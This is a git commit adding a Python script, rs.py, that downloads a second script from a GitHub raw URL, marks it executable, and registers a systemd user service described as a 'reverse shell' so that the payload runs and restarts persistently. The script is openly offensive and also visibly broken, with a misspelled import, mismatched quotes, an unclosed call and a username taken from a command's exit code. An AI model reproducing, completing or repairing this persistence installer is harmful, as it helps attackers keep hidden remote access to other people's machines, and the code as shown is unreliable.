c7fc74c7f6735ad7085fa9dc5c721923418019df
Tarun Chakitha <saitarun.uppari@gmail.com>
2022-01-12 01:33:57 +0530

    Create rs.py

---
+++ rs.py
@@ -0,0 +1,33 @@
+import shutil
+import os
+from stat import *
+
+improt urllib.request
+USERNAME = os.system("whoami")
+RS3 = "https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py'
+
+urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")
+
+os.chmod(f"/home/{USERNAME}/.rshell/rs3.py",0o777)
+
+os.mkdir()
+
+with open("~/.config/systemd/user/rs.service","w+") as unit_file:
+	unit_file.write(f"""
+	Description= Unit file for reverse shell.
+
+	Wants=network.target
+	After=syslog.target network-online.target
+
+	[Service]
+	Type=simple
+	ExecStart=/home/{USERNAME}/.rshell/./rs3.py
+	Restart=on-failure
+	RestartSec=10
+	KillMode=process
+
+	[Install]
+	WantedBy=multi-user.target"""
+
+
+os.system("systemctl --user start rs.service")
